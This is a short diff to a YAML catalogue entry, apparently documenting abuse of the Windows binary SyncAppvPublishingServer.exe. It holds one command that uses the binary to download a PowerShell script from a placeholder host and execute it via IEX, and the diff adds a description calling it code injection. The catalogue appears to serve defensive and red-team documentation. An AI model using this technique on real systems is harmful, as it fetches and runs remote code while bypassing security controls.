@@ -5,9 +5,8 @@ Author: ''
 Created: '2018-05-25'
 Categories: []
 Commands:
-  - Command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1')
-      | IEX"
-    Description: ''
+  - Command: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
+    Description: Example command on how inject Powershell code into the process
 Full Path:
   - C:\Windows\System32\SyncAppvPublishingServer.exe
 Code Sample: []
